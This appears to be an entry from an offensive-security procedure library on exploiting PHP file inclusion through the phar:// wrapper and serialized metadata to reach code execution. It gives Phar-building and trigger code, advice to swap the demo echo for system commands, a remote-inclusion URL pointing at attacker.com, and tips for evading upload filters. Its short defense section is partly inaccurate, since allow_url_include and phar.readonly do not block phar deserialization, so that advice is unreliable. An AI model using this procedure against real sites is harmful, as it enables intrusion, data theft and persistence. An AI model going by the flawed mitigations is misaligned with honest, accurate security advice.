---
type: procedure
description: >-
  Exploit LFI/RFI vulnerabilities using the phar:// wrapper to unserialize a
  malicious object and trigger code execution via magic methods.
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Python]]'
sub_techniques: []
tags:
  - file-inclusion
  - lfi
  - rfi
  - phar-wrapper
  - php
  - rce
commands: []
tools: []
platforms:
  - Web
  - PHP
skill_level: intermediate
impact_level: high
detection_risk: high
verified: true
validated: true
---

# LFI-RFI-via-phar-Wrapper-with-Serialized-Object

## Summary

This procedure demonstrates how to exploit Local File Inclusion (LFI) or Remote File Inclusion (RFI) vulnerabilities in PHP applications by leveraging the phar:// stream wrapper. An attacker creates a malicious Phar archive containing a serialized object in its metadata. When the application performs file operations on this Phar file via the phar:// wrapper, the metadata is unserialized, automatically invoking magic methods like __destruct() or __wakeup() if present in the object's class, leading to arbitrary code execution. This technique is useful for escalating LFI to remote code execution (RCE) in vulnerable web applications.

## Description

In PHP applications vulnerable to LFI or RFI, attackers can often include local or remote files to read sensitive data or execute code. The phar:// wrapper enhances this by allowing Phar archives to be treated as regular files. By embedding a serialized PHP object in the Phar file's metadata, any file operation (e.g., include, file_exists) on the Phar via phar:// triggers unserialization. If the application defines a class with dangerous magic methods (__destruct or __wakeup), these execute during unserialization, enabling RCE without direct command injection. This targets environments where allow_url_include is enabled or LFI allows local file access. Prerequisites include uploading the Phar file to the target (e.g., via file upload vuln) and a parameter vulnerable to inclusion like ?file=upload/test.phar/test.txt. Expected outcomes include code execution, data exfiltration, or further compromise.

## Requirements

1. PHP environment on the target with Phar extension enabled (common in default installs).
2. Ability to upload the malicious Phar file to the target web root or accessible directory (e.g., via file upload vulnerability).
3. LFI/RFI vulnerability allowing inclusion of local files via phar:// wrapper (e.g., include($_GET['file']); without proper sanitization).
4. Knowledge of a class in the application that can be extended or matched for magic methods (or ability to define one in the serialized object).
5. Attacker-controlled server to host the Phar if RFI is used, though this example focuses on LFI.

## Defense

Defensive measures and detection strategies:

- Disable the phar:// wrapper by setting allow_url_include=Off and phar.readonly=On in php.ini; use ini_set() if needed.
- Validate and sanitize all file inclusion parameters to prevent wrapper usage (e.g., basename() and path validation).
- Avoid using __destruct() or __wakeup() in classes that could be unserialized from user input; implement safe unserialization with allowed_classes.
- Monitor file uploads for .phar extensions and scan for suspicious serialized objects using tools like phan or custom scripts.
- Enable PHP logging for unserialize calls and file inclusions; use WAF rules to block phar:// in URLs.

## Objectives

1. Upload and position a malicious Phar file on the target system.
2. Trigger unserialization via LFI/RFI to execute arbitrary code through magic methods.
3. Achieve remote code execution (RCE) for further compromise, such as data exfiltration or persistence.
4. Demonstrate escalation from file read to code execution in vulnerable PHP apps.

## Instructions

### Step 1: Create the Malicious Phar File

**Context**: Generate a Phar archive containing a dummy file and a serialized object in metadata. The object uses a custom class that will trigger on unserialization. This Phar must be uploaded to the target later.

**Code** ([[codes/Create-Malicious-Phar-with-Serialized-Object]]):

```php
// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// add object of any class as meta data
class AnyClass {}
$object = new AnyClass;
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();
```

> This code creates 'test.phar' with 'test.txt' inside, sets a minimal stub to halt compilation, and embeds a serialized AnyClass object with a 'data' property. Run this on your local machine to generate the file, then upload it to the target (e.g., via /upload.php). Expected: A valid Phar file of ~1KB that can be included via phar://.

### Step 2: Define Trigger Class and Include Phar

**Context**: On the target, if you can influence the class definition (e.g., via another vuln) or if the app has a matching class, define __destruct to execute code. Then include the Phar via LFI parameter to trigger unserialization.

**Code** ([[codes/Trigger-Phar-Unserialize-via-Class-Destruct-and-Include]]):

```php
class AnyClass {
    function __destruct() {
        echo $this->data;
    }
}
// output: rips
include('phar://test.phar');
```

> This defines AnyClass with __destruct that echoes the metadata 'data' property. The include('phar://test.phar') unserializes the metadata, invoking __destruct. In a real exploit, replace echo with system('id') or file_get_contents for RCE. Expected: Output 'rips' (or executed command result) if vulnerable.

### Step 3: Trigger via File Operation

**Context**: If direct include is filtered, use other file functions like file_exists to trigger unserialization. This works for any PHP file operation on the Phar.

**Code** ([[codes/Trigger-Phar-Unserialize-via-File-Exists]]):

```php
file_exists('phar://test.phar');
```

> This PHP function call checks existence but triggers metadata unserialization. In the vulnerable app, if ?file=phar://test.phar/test.txt uses file_exists internally, it executes the magic method. Expected: Boolean true/false, but side-effect of code execution from unserialize.

### Step 4: Verify Exploitation

**Context**: Test the LFI parameter with the Phar path. Use Burp or curl to send requests like GET /vulnerable.php?file=phar://upload/test.phar/test.txt. Monitor for output from the magic method.

**Instructions**: If upload succeeds, craft the inclusion URL. For RFI, host the Phar remotely and use phar://http://attacker.com/test.phar. Check server logs or response for execution indicators (e.g., echoed data or command output).

> Decision point: If __destruct doesn't trigger, try __wakeup in the class. If Phar upload blocked, encode or rename the file.
